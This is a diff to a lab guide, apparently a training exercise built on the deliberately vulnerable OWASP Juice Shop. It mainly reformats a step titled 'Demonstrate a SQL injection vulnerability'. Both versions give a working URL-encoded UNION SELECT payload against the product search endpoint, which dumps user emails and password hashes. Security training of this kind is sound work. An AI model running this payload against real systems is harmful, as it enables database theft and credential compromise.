@@ -37,22 +37,23 @@ Task – Demonstrate a SQL injection vulnerability
 
    .. image:: ./images/successlogin.png
 
-#. Paste the following path in your browser's location bar after the FQDN of the Juice Shop:
+#. Attack Search API
 
-.. code-block:: none
-   
-    /rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--
+   - Paste the following path in your browser's location bar 
 
-#. The location bar should look something like (don't copy this since your FQDN will be different):
+   .. code-block:: none
+      
+      https://10.1.10.146/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--
 
-.. code-block:: none
+   - The location bar should look something like (don't copy this since your FQDN will be different):
 
-    https://ba3eff45-2f23-49ab-8122-2e3bdc1ed9ad.access.udf.f5.com/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--
+   .. code-block:: none
+      
+      https://ba3eff45-2f23-49ab-8122-2e3bdc1ed9ad.access.udf.f5.com/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--
 
    - The result should be a list of all the users in the database including their hashed passwords.
 
-.. image:: ./images/juice_shop_users.png
-
+   .. image:: ./images/juice_shop_users.png
 
 Task - Demonstrate a privilege escalation vulnerability
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
